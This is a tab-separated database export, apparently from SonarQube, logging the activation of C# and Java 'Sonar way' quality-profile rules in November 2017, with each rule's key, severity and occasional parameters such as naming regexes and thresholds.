43	2017-11-23 16:16:51.226	\N	key=cs-sonar-way-15357:csharpsquid:S3444;ruleKey=csharpsquid:S3444;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquIZzJFC7L4qK5Zw
44	2017-11-23 16:16:51.229	\N	key=cs-sonar-way-15357:csharpsquid:S2278;ruleKey=csharpsquid:S2278;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquIdzJFC7L4qK5Zx
45	2017-11-23 16:16:51.232	\N	key=cs-sonar-way-15357:csharpsquid:S1944;ruleKey=csharpsquid:S1944;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquIgzJFC7L4qK5Zy
46	2017-11-23 16:16:51.236	\N	key=cs-sonar-way-15357:csharpsquid:S3220;ruleKey=csharpsquid:S3220;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquIkzJFC7L4qK5Zz
47	2017-11-23 16:16:51.239	\N	key=cs-sonar-way-15357:csharpsquid:S2184;ruleKey=csharpsquid:S2184;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquInzJFC7L4qK5Z0
48	2017-11-23 16:16:51.243	\N	key=cs-sonar-way-15357:csharpsquid:S1185;ruleKey=csharpsquid:S1185;profileKey=cs-sonar-way-15357;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquIrzJFC7L4qK5Z1
49	2017-11-23 16:16:51.247	\N	key=cs-sonar-way-15357:csharpsquid:S3218;ruleKey=csharpsquid:S3218;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquIuzJFC7L4qK5Z2
50	2017-11-23 16:16:51.25	\N	key=cs-sonar-way-15357:csharpsquid:S3427;ruleKey=csharpsquid:S3427;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquIyzJFC7L4qK5Z3
51	2017-11-23 16:16:51.254	\N	key=cs-sonar-way-15357:csharpsquid:S1006;ruleKey=csharpsquid:S1006;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquI2zJFC7L4qK5Z4
52	2017-11-23 16:16:51.258	\N	key=cs-sonar-way-15357:csharpsquid:S3262;ruleKey=csharpsquid:S3262;profileKey=cs-sonar-way-15357;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquI6zJFC7L4qK5Z5
53	2017-11-23 16:16:51.262	\N	key=cs-sonar-way-15357:csharpsquid:S3450;ruleKey=csharpsquid:S3450;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquI-zJFC7L4qK5Z6
54	2017-11-23 16:16:51.265	\N	key=cs-sonar-way-15357:csharpsquid:S1172;ruleKey=csharpsquid:S1172;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquJBzJFC7L4qK5Z7
55	2017-11-23 16:16:51.268	\N	key=cs-sonar-way-15357:csharpsquid:S2681;ruleKey=csharpsquid:S2681;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquJEzJFC7L4qK5Z8
56	2017-11-23 16:16:51.272	\N	key=cs-sonar-way-15357:csharpsquid:S3265;ruleKey=csharpsquid:S3265;profileKey=cs-sonar-way-15357;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquJHzJFC7L4qK5Z9
57	2017-11-23 16:16:51.275	\N	key=cs-sonar-way-15357:csharpsquid:S1848;ruleKey=csharpsquid:S1848;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquJLzJFC7L4qK5Z-
58	2017-11-23 16:16:51.278	\N	key=cs-sonar-way-15357:csharpsquid:S2360;ruleKey=csharpsquid:S2360;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquJOzJFC7L4qK5Z_
59	2017-11-23 16:16:51.282	\N	key=cs-sonar-way-15357:csharpsquid:S3466;ruleKey=csharpsquid:S3466;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquJSzJFC7L4qK5aA
60	2017-11-23 16:16:51.285	\N	key=cs-sonar-way-15357:csharpsquid:S3451;ruleKey=csharpsquid:S3451;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquJVzJFC7L4qK5aB
61	2017-11-23 16:16:51.289	\N	key=cs-sonar-way-15357:csharpsquid:S3447;ruleKey=csharpsquid:S3447;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquJZzJFC7L4qK5aC
62	2017-11-23 16:16:51.294	\N	key=cs-sonar-way-15357:csharpsquid:S3169;ruleKey=csharpsquid:S3169;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquJezJFC7L4qK5aD
63	2017-11-23 16:16:51.298	\N	key=cs-sonar-way-15357:csharpsquid:S927;ruleKey=csharpsquid:S927;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquJizJFC7L4qK5aE
64	2017-11-23 16:16:51.302	\N	key=cs-sonar-way-15357:csharpsquid:S2234;ruleKey=csharpsquid:S2234;profileKey=cs-sonar-way-15357;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquJmzJFC7L4qK5aF
65	2017-11-23 16:16:51.305	\N	key=cs-sonar-way-15357:csharpsquid:S3251;ruleKey=csharpsquid:S3251;profileKey=cs-sonar-way-15357;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquJpzJFC7L4qK5aG
66	2017-11-23 16:16:51.312	\N	key=cs-sonar-way-15357:csharpsquid:S2372;ruleKey=csharpsquid:S2372;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquJwzJFC7L4qK5aH
67	2017-11-23 16:16:51.316	\N	key=cs-sonar-way-15357:csharpsquid:S2292;ruleKey=csharpsquid:S2292;profileKey=cs-sonar-way-15357;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquJ0zJFC7L4qK5aI
68	2017-11-23 16:16:51.319	\N	key=cs-sonar-way-15357:csharpsquid:S2376;ruleKey=csharpsquid:S2376;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquJ3zJFC7L4qK5aJ
69	2017-11-23 16:16:51.323	\N	key=cs-sonar-way-15357:csharpsquid:S2368;ruleKey=csharpsquid:S2368;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquJ7zJFC7L4qK5aK
70	2017-11-23 16:16:51.326	\N	key=cs-sonar-way-15357:csharpsquid:S1905;ruleKey=csharpsquid:S1905;profileKey=cs-sonar-way-15357;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquJ-zJFC7L4qK5aL
71	2017-11-23 16:16:51.33	\N	key=cs-sonar-way-15357:csharpsquid:S1939;ruleKey=csharpsquid:S1939;profileKey=cs-sonar-way-15357;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquKCzJFC7L4qK5aM
72	2017-11-23 16:16:51.334	\N	key=cs-sonar-way-15357:csharpsquid:S3456;ruleKey=csharpsquid:S3456;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquKGzJFC7L4qK5aN
73	2017-11-23 16:16:51.337	\N	key=cs-sonar-way-15357:csharpsquid:S1698;ruleKey=csharpsquid:S1698;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquKJzJFC7L4qK5aO
74	2017-11-23 16:16:51.34	\N	key=cs-sonar-way-15357:csharpsquid:S2995;ruleKey=csharpsquid:S2995;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquKMzJFC7L4qK5aP
75	2017-11-23 16:16:51.344	\N	key=cs-sonar-way-15357:csharpsquid:S2757;ruleKey=csharpsquid:S2757;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquKQzJFC7L4qK5aQ
76	2017-11-23 16:16:51.347	\N	key=cs-sonar-way-15357:csharpsquid:S1656;ruleKey=csharpsquid:S1656;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquKTzJFC7L4qK5aR
77	2017-11-23 16:16:51.35	\N	key=cs-sonar-way-15357:csharpsquid:S3449;ruleKey=csharpsquid:S3449;profileKey=cs-sonar-way-15357;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquKWzJFC7L4qK5aS
78	2017-11-23 16:16:51.354	\N	key=cs-sonar-way-15357:csharpsquid:S1697;ruleKey=csharpsquid:S1697;profileKey=cs-sonar-way-15357;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquKazJFC7L4qK5aT
79	2017-11-23 16:16:51.357	\N	key=cs-sonar-way-15357:csharpsquid:S2437;ruleKey=csharpsquid:S2437;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquKdzJFC7L4qK5aU
80	2017-11-23 16:16:51.361	\N	key=cs-sonar-way-15357:csharpsquid:S2743;ruleKey=csharpsquid:S2743;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquKhzJFC7L4qK5aV
81	2017-11-23 16:16:51.365	\N	key=cs-sonar-way-15357:csharpsquid:S3263;ruleKey=csharpsquid:S3263;profileKey=cs-sonar-way-15357;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquKkzJFC7L4qK5aW
82	2017-11-23 16:16:51.368	\N	key=cs-sonar-way-15357:csharpsquid:S2223;ruleKey=csharpsquid:S2223;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquKozJFC7L4qK5aX
83	2017-11-23 16:16:51.372	\N	key=cs-sonar-way-15357:csharpsquid:S2696;ruleKey=csharpsquid:S2696;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquKszJFC7L4qK5aY
84	2017-11-23 16:16:51.375	\N	key=cs-sonar-way-15357:csharpsquid:S1643;ruleKey=csharpsquid:S1643;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquKvzJFC7L4qK5aZ
85	2017-11-23 16:16:51.379	\N	key=cs-sonar-way-15357:csharpsquid:S2275;ruleKey=csharpsquid:S2275;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquKzzJFC7L4qK5aa
86	2017-11-23 16:16:51.383	\N	key=cs-sonar-way-15357:csharpsquid:S3457;ruleKey=csharpsquid:S3457;profileKey=cs-sonar-way-15357;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquK3zJFC7L4qK5ab
87	2017-11-23 16:16:51.388	\N	key=cs-sonar-way-15357:csharpsquid:S1449;ruleKey=csharpsquid:S1449;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquK8zJFC7L4qK5ac
88	2017-11-23 16:16:51.393	\N	key=cs-sonar-way-15357:csharpsquid:S3234;ruleKey=csharpsquid:S3234;profileKey=cs-sonar-way-15357;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquLBzJFC7L4qK5ad
89	2017-11-23 16:16:51.397	\N	key=cs-sonar-way-15357:csharpsquid:S3216;ruleKey=csharpsquid:S3216;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquLFzJFC7L4qK5ae
90	2017-11-23 16:16:51.4	\N	key=cs-sonar-way-15357:csharpsquid:S2758;ruleKey=csharpsquid:S2758;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquLIzJFC7L4qK5af
91	2017-11-23 16:16:51.404	\N	key=cs-sonar-way-15357:csharpsquid:S3005;ruleKey=csharpsquid:S3005;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquLMzJFC7L4qK5ag
92	2017-11-23 16:16:51.407	\N	key=cs-sonar-way-15357:csharpsquid:S2996;ruleKey=csharpsquid:S2996;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquLPzJFC7L4qK5ah
93	2017-11-23 16:16:51.411	\N	key=cs-sonar-way-15357:csharpsquid:S2225;ruleKey=csharpsquid:S2225;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquLTzJFC7L4qK5ai
94	2017-11-23 16:16:51.415	\N	key=cs-sonar-way-15357:csharpsquid:S3443;ruleKey=csharpsquid:S3443;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquLXzJFC7L4qK5aj
95	2017-11-23 16:16:51.418	\N	key=cs-sonar-way-15357:csharpsquid:S2761;ruleKey=csharpsquid:S2761;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquLazJFC7L4qK5ak
96	2017-11-23 16:16:51.422	\N	key=cs-sonar-way-15357:csharpsquid:S1144;ruleKey=csharpsquid:S1144;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquLezJFC7L4qK5al
97	2017-11-23 16:16:51.427	\N	key=cs-sonar-way-15357:csharpsquid:S3237;ruleKey=csharpsquid:S3237;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquLjzJFC7L4qK5am
98	2017-11-23 16:16:51.431	\N	key=cs-sonar-way-15357:csharpsquid:S2123;ruleKey=csharpsquid:S2123;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquLnzJFC7L4qK5an
99	2017-11-23 16:16:51.435	\N	key=cs-sonar-way-15357:csharpsquid:S1117;ruleKey=csharpsquid:S1117;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquLrzJFC7L4qK5ao
100	2017-11-23 16:16:51.439	\N	key=cs-sonar-way-15357:csharpsquid:S1481;ruleKey=csharpsquid:S1481;profileKey=cs-sonar-way-15357;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquLvzJFC7L4qK5ap
101	2017-11-23 16:16:51.444	\N	key=cs-sonar-way-15357:csharpsquid:S2290;ruleKey=csharpsquid:S2290;profileKey=cs-sonar-way-15357;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquL0zJFC7L4qK5aq
102	2017-11-23 16:16:51.465	\N	key=java-sonar-way-86530:common-java:DuplicatedBlocks;ruleKey=common-java:DuplicatedBlocks;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquMJzJFC7L4qK5ar
103	2017-11-23 16:16:51.482	\N	key=java-sonar-way-86530:common-java:InsufficientBranchCoverage;ruleKey=common-java:InsufficientBranchCoverage;profileKey=java-sonar-way-86530;param_minimumBranchCoverageRatio=65.0;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquMazJFC7L4qK5as
104	2017-11-23 16:16:51.495	\N	key=java-sonar-way-86530:squid:MethodCyclomaticComplexity;ruleKey=squid:MethodCyclomaticComplexity;profileKey=java-sonar-way-86530;param_Threshold=10;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquMnzJFC7L4qK5at
105	2017-11-23 16:16:51.508	\N	key=java-sonar-way-86530:squid:CommentedOutCodeLine;ruleKey=squid:CommentedOutCodeLine;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquM0zJFC7L4qK5au
106	2017-11-23 16:16:51.517	\N	key=java-sonar-way-86530:squid:S00108;ruleKey=squid:S00108;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquM9zJFC7L4qK5av
107	2017-11-23 16:16:51.528	\N	key=java-sonar-way-86530:squid:S00107;ruleKey=squid:S00107;profileKey=java-sonar-way-86530;param_max=7;param_constructorMax=7;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquNIzJFC7L4qK5aw
108	2017-11-23 16:16:51.538	\N	key=java-sonar-way-86530:squid:S00112;ruleKey=squid:S00112;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquNRzJFC7L4qK5ax
109	2017-11-23 16:16:51.548	\N	key=java-sonar-way-86530:squid:S00100;ruleKey=squid:S00100;profileKey=java-sonar-way-86530;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquNczJFC7L4qK5ay
110	2017-11-23 16:16:51.561	\N	key=java-sonar-way-86530:squid:S00101;ruleKey=squid:S00101;profileKey=java-sonar-way-86530;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquNpzJFC7L4qK5az
111	2017-11-23 16:16:51.576	\N	key=java-sonar-way-86530:squid:S00114;ruleKey=squid:S00114;profileKey=java-sonar-way-86530;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquN4zJFC7L4qK5a0
112	2017-11-23 16:16:51.582	\N	key=java-sonar-way-86530:squid:S00115;ruleKey=squid:S00115;profileKey=java-sonar-way-86530;param_format=^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquN-zJFC7L4qK5a1
113	2017-11-23 16:16:51.586	\N	key=java-sonar-way-86530:squid:S00116;ruleKey=squid:S00116;profileKey=java-sonar-way-86530;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquOCzJFC7L4qK5a2
114	2017-11-23 16:16:51.59	\N	key=java-sonar-way-86530:squid:S3008;ruleKey=squid:S3008;profileKey=java-sonar-way-86530;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquOGzJFC7L4qK5a3
115	2017-11-23 16:16:51.594	\N	key=java-sonar-way-86530:squid:S00117;ruleKey=squid:S00117;profileKey=java-sonar-way-86530;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquOKzJFC7L4qK5a4
116	2017-11-23 16:16:51.598	\N	key=java-sonar-way-86530:squid:S00119;ruleKey=squid:S00119;profileKey=java-sonar-way-86530;param_format=^[A-Z][0-9]?$;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquONzJFC7L4qK5a5
117	2017-11-23 16:16:51.601	\N	key=java-sonar-way-86530:squid:S00120;ruleKey=squid:S00120;profileKey=java-sonar-way-86530;param_format=^[a-z]+(\\.[a-z][a-z0-9]*)*$;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquORzJFC7L4qK5a6
118	2017-11-23 16:16:51.604	\N	key=java-sonar-way-86530:squid:S00122;ruleKey=squid:S00122;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquOUzJFC7L4qK5a7
119	2017-11-23 16:16:51.607	\N	key=java-sonar-way-86530:squid:UselessParenthesesCheck;ruleKey=squid:UselessParenthesesCheck;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquOXzJFC7L4qK5a8
120	2017-11-23 16:16:51.611	\N	key=java-sonar-way-86530:squid:ObjectFinalizeCheck;ruleKey=squid:ObjectFinalizeCheck;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquObzJFC7L4qK5a9
121	2017-11-23 16:16:51.617	\N	key=java-sonar-way-86530:squid:ObjectFinalizeOverridenCheck;ruleKey=squid:ObjectFinalizeOverridenCheck;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquOhzJFC7L4qK5a-
122	2017-11-23 16:16:51.621	\N	key=java-sonar-way-86530:squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;ruleKey=squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquOlzJFC7L4qK5a_
123	2017-11-23 16:16:51.624	\N	key=java-sonar-way-86530:squid:ClassVariableVisibilityCheck;ruleKey=squid:ClassVariableVisibilityCheck;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquOozJFC7L4qK5bA
124	2017-11-23 16:16:51.628	\N	key=java-sonar-way-86530:squid:ForLoopCounterChangedCheck;ruleKey=squid:ForLoopCounterChangedCheck;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquOszJFC7L4qK5bB
125	2017-11-23 16:16:51.631	\N	key=java-sonar-way-86530:squid:LabelsShouldNotBeUsedCheck;ruleKey=squid:LabelsShouldNotBeUsedCheck;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquOvzJFC7L4qK5bC
126	2017-11-23 16:16:51.635	\N	key=java-sonar-way-86530:squid:SwitchLastCaseIsDefaultCheck;ruleKey=squid:SwitchLastCaseIsDefaultCheck;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquOzzJFC7L4qK5bD
127	2017-11-23 16:16:51.639	\N	key=java-sonar-way-86530:squid:ModifiersOrderCheck;ruleKey=squid:ModifiersOrderCheck;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquO3zJFC7L4qK5bE
128	2017-11-23 16:16:51.643	\N	key=java-sonar-way-86530:squid:AssignmentInSubExpressionCheck;ruleKey=squid:AssignmentInSubExpressionCheck;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquO7zJFC7L4qK5bF
129	2017-11-23 16:16:51.648	\N	key=java-sonar-way-86530:squid:UselessImportCheck;ruleKey=squid:UselessImportCheck;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquPAzJFC7L4qK5bG
130	2017-11-23 16:16:51.652	\N	key=java-sonar-way-86530:squid:LowerCaseLongSuffixCheck;ruleKey=squid:LowerCaseLongSuffixCheck;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquPEzJFC7L4qK5bH
131	2017-11-23 16:16:51.656	\N	key=java-sonar-way-86530:squid:MissingDeprecatedCheck;ruleKey=squid:MissingDeprecatedCheck;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquPIzJFC7L4qK5bI
132	2017-11-23 16:16:51.66	\N	key=java-sonar-way-86530:squid:HiddenFieldCheck;ruleKey=squid:HiddenFieldCheck;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquPMzJFC7L4qK5bJ
133	2017-11-23 16:16:51.663	\N	key=java-sonar-way-86530:squid:S1133;ruleKey=squid:S1133;profileKey=java-sonar-way-86530;severity=INFO	QPROFILE	ACTIVATED	\N	AV_pquPPzJFC7L4qK5bK
134	2017-11-23 16:16:51.667	\N	key=java-sonar-way-86530:squid:S1134;ruleKey=squid:S1134;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquPTzJFC7L4qK5bL
135	2017-11-23 16:16:51.67	\N	key=java-sonar-way-86530:squid:S1135;ruleKey=squid:S1135;profileKey=java-sonar-way-86530;severity=INFO	QPROFILE	ACTIVATED	\N	AV_pquPWzJFC7L4qK5bM
136	2017-11-23 16:16:51.674	\N	key=java-sonar-way-86530:squid:S1118;ruleKey=squid:S1118;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquPazJFC7L4qK5bN
137	2017-11-23 16:16:51.677	\N	key=java-sonar-way-86530:squid:S1132;ruleKey=squid:S1132;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquPdzJFC7L4qK5bO
138	2017-11-23 16:16:51.681	\N	key=java-sonar-way-86530:squid:S1126;ruleKey=squid:S1126;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquPhzJFC7L4qK5bP
139	2017-11-23 16:16:51.684	\N	key=java-sonar-way-86530:squid:S1125;ruleKey=squid:S1125;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquPkzJFC7L4qK5bQ
140	2017-11-23 16:16:51.69	\N	key=java-sonar-way-86530:squid:S1067;ruleKey=squid:S1067;profileKey=java-sonar-way-86530;param_max=3;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquPqzJFC7L4qK5bR
141	2017-11-23 16:16:51.694	\N	key=java-sonar-way-86530:squid:S1141;ruleKey=squid:S1141;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquPuzJFC7L4qK5bS
142	2017-11-23 16:16:51.699	\N	key=java-sonar-way-86530:squid:S1147;ruleKey=squid:S1147;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquPzzJFC7L4qK5bT
143	2017-11-23 16:16:51.703	\N	key=java-sonar-way-86530:squid:S1143;ruleKey=squid:S1143;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquP3zJFC7L4qK5bU
144	2017-11-23 16:16:51.706	\N	key=java-sonar-way-86530:squid:S1157;ruleKey=squid:S1157;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquP6zJFC7L4qK5bV
145	2017-11-23 16:16:51.711	\N	key=java-sonar-way-86530:squid:S1155;ruleKey=squid:S1155;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquP_zJFC7L4qK5bW
146	2017-11-23 16:16:51.715	\N	key=java-sonar-way-86530:squid:S1149;ruleKey=squid:S1149;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquQDzJFC7L4qK5bX
147	2017-11-23 16:16:51.719	\N	key=java-sonar-way-86530:squid:S1171;ruleKey=squid:S1171;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquQHzJFC7L4qK5bY
148	2017-11-23 16:16:51.723	\N	key=java-sonar-way-86530:squid:S1168;ruleKey=squid:S1168;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquQLzJFC7L4qK5bZ
149	2017-11-23 16:16:51.727	\N	key=java-sonar-way-86530:squid:S1170;ruleKey=squid:S1170;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquQPzJFC7L4qK5ba
150	2017-11-23 16:16:51.731	\N	key=java-sonar-way-86530:squid:S1163;ruleKey=squid:S1163;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquQTzJFC7L4qK5bb
151	2017-11-23 16:16:51.734	\N	key=java-sonar-way-86530:squid:S106;ruleKey=squid:S106;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquQWzJFC7L4qK5bc
152	2017-11-23 16:16:51.737	\N	key=java-sonar-way-86530:squid:S1165;ruleKey=squid:S1165;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquQZzJFC7L4qK5bd
153	2017-11-23 16:16:51.741	\N	key=java-sonar-way-86530:squid:S1066;ruleKey=squid:S1066;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquQdzJFC7L4qK5be
154	2017-11-23 16:16:51.745	\N	key=java-sonar-way-86530:squid:S134;ruleKey=squid:S134;profileKey=java-sonar-way-86530;param_max=3;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquQhzJFC7L4qK5bf
155	2017-11-23 16:16:51.748	\N	key=java-sonar-way-86530:squid:S1181;ruleKey=squid:S1181;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquQkzJFC7L4qK5bg
156	2017-11-23 16:16:51.751	\N	key=java-sonar-way-86530:squid:S1150;ruleKey=squid:S1150;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquQnzJFC7L4qK5bh
157	2017-11-23 16:16:51.754	\N	key=java-sonar-way-86530:squid:S1182;ruleKey=squid:S1182;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquQqzJFC7L4qK5bi
158	2017-11-23 16:16:51.759	\N	key=java-sonar-way-86530:squid:S1151;ruleKey=squid:S1151;profileKey=java-sonar-way-86530;param_max=5;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquQvzJFC7L4qK5bj
159	2017-11-23 16:16:51.763	\N	key=java-sonar-way-86530:squid:S128;ruleKey=squid:S128;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquQzzJFC7L4qK5bk
